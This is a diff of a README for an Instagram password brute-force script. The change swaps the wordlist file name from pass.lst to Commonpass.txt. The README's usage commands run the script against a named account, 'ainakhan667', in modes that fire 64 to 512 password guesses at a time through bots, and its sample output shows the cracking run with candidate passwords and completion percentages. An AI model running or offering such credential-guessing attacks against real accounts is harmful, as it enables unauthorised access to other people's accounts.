@@ -59,7 +59,7 @@ python3 instagram.py <username> <wordlist> -m <mode>
 This mode uses only 4 bots, or 64 passwords at a time.
 
 ```
-C:\Users\Wajahat\Desktop\Instagram>python3 instagram.py ainakhan667 pass.lst -m 3
+C:\Users\Wajahat\Desktop\Instagram>python3 instagram.py ainakhan667 Commonpass.txt -m 3
 ```
 
 ### Moderate mode 1
@@ -67,7 +67,7 @@ C:\Users\Wajahat\Desktop\Instagram>python3 instagram.py ainakhan667 pass.lst -m 
 This mode uses 8 bots, or 128 passwords at a time.
 
 ```
-C:\Users\Wajahat\Desktop\Instagram>python3 instagram.py ainakhan667 pass.lst -m 2
+C:\Users\Wajahat\Desktop\Instagram>python3 instagram.py ainakhan667 Commonpass.txt -m 2
 ```
 
 ### Moderate mode 2
@@ -75,7 +75,7 @@ C:\Users\Wajahat\Desktop\Instagram>python3 instagram.py ainakhan667 pass.lst -m 
 This mode uses 16 bots, or 256 passwords at a time.
 
 ```
-C:\Users\Wajahat\Desktop\Instagram>python3 instagram.py ainakhan667 pass.lst -m 1
+C:\Users\Wajahat\Desktop\Instagram>python3 instagram.py ainakhan667 Commonpass.txt -m 1
 ```
 
 ### Savage mode
@@ -83,7 +83,7 @@ C:\Users\Wajahat\Desktop\Instagram>python3 instagram.py ainakhan667 pass.lst -m 
 This mode uses 32 bots, or 512 passwords at a time.
 
 ```
-C:\Users\Wajahat\Desktop\Instagram>python3 instagram.py ainakhan667 pass.lst -m 0
+C:\Users\Wajahat\Desktop\Instagram>python3 instagram.py ainakhan667 Commonpass.txt -m 0
 ```
 
 ### If you don't specify a mode, then mode is set to 2
@@ -91,7 +91,7 @@ C:\Users\Wajahat\Desktop\Instagram>python3 instagram.py ainakhan667 pass.lst -m 
 ### Run
 
 ```
-[-] Wordlist: pass.lst
+[-] Wordlist: Commonpass.txt
 [-] Username: ainakhan667
 [-] Password: football
 [-] Complete: 45.51%
@@ -103,7 +103,7 @@ C:\Users\Wajahat\Desktop\Instagram>python3 instagram.py ainakhan667 pass.lst -m 
 ### Stop
 
 ```
-[-] Wordlist: pass.lst
+[-] Wordlist: Commonpass.txt
 [-] Username: ainakhan667
 [-] Password: hackme
 [-] Complete: 62.67%
